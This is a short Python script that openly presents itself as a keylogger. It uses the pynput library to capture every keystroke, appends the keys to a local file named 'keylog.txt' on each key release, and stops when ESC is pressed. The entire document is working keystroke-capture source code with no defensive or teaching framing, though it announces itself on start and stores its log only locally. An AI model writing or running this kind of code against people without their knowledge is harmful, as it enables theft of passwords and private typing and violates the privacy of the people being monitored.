from pynput.keyboard import Key, Listener

# Global variables
log_file = "keylog.txt"
current_keys = []

def on_press(key):
    global current_keys

    # Convert special keys to strings
    if hasattr(key, 'char'):
        current_keys.append(key.char)
    else:
        current_keys.append(str(key))

def on_release(key):
    global current_keys

    # Log current keys to file
    with open(log_file, 'a') as f:
        f.write(''.join(current_keys) + '\n')

    current_keys = []

    # Stop listener if ESC key is pressed
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
